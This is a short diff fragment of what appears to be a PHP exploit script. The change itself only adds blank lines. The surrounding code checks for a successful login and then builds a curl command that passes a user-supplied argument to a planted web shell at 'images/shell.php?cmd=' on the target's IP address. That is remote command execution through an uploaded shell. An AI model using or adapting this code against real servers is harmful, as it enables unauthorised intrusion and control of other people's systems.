@@ -84,7 +84,8 @@ if(curl_errno($curl)){
 } else{
 	echo "Successful Login!\n";
 }
- 
+
+
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
 $shellcmd = $argv[3];
 echo $cmd.$shellcmd; 
